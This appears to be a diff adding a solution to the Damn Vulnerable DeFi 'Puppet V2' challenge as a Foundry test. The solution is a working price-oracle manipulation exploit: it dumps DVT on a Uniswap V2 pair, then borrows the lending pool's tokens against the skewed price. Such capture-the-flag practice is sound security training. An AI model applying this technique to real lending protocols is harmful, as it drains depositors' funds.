@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
@@ -10,6 +11,7 @@ import {WETH9} from "../../../src/Contracts/WETH9.sol";
 import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
 
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
+import {UniswapV2Library} from "../../../src/Contracts/puppet-v2/UniswapV2Library.sol";
 
 contract PuppetV2 is Test {
     // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
@@ -118,6 +120,46 @@ contract PuppetV2 is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapV2Pair), type(uint256).max);
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+
+        // Convert our ETH to wETH 
+        weth.deposit{value: attacker.balance - 0.05 ether}();
+
+        (uint256 reservesWETH, uint256 reservesDVT) = UniswapV2Library.getReserves(address(uniswapV2Factory), address(weth), address(dvt));
+        uint256 amountOfWEthICanGet = UniswapV2Library.getAmountOut(dvt.balanceOf(attacker), reservesDVT, reservesWETH);
+        console2.log("Starting the level with %s ETH, %s WETH and %s DVT", address(attacker).balance, weth.balanceOf(attacker), dvt.balanceOf(attacker));
+        console2.log("Can get %s WETH selling initial dvt tokens", amountOfWEthICanGet);
+
+        // Dump all the dvt tokens on the exchange
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), amountOfWEthICanGet, path, attacker, block.timestamp);
+        console2.log("Now have %s ETH, %s WETH and %s DVT after 0 loop", address(attacker).balance, weth.balanceOf(attacker), dvt.balanceOf(attacker));
+
+        // Lever up using the ETH I just got and exploiting the new price
+
+        // ------------------- First loop -----------------------
+
+        // We compute the amount we can borrow based on the current price
+        uint256 maxDVTWeCanBorrow = dvt.balanceOf(address(puppetV2Pool));
+        uint256 maxWETHWeNeed = puppetV2Pool.calculateDepositOfWETHRequired(maxDVTWeCanBorrow);
+        console2.log("%s, %s, %s", maxDVTWeCanBorrow, maxWETHWeNeed, weth.balanceOf(attacker));
+        maxDVTWeCanBorrow = weth.balanceOf(attacker) < maxWETHWeNeed ? maxDVTWeCanBorrow * weth.balanceOf(attacker) / maxWETHWeNeed : maxDVTWeCanBorrow;
+        maxWETHWeNeed = puppetV2Pool.calculateDepositOfWETHRequired(maxDVTWeCanBorrow);
+
+        console2.log("Can borrow %s tokens using %s wwei", maxDVTWeCanBorrow, maxWETHWeNeed);
+
+        puppetV2Pool.borrow(maxDVTWeCanBorrow);
+        console2.log("Now have %s ETH after 1 loop, puppetV2Pool has %s tokens, I have %s tokens", address(attacker).balance, dvt.balanceOf(address(puppetV2Pool)), dvt.balanceOf(attacker));
+
+        console2.log("Finishing the level with %s ETH", address(attacker).balance / 1e18);
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
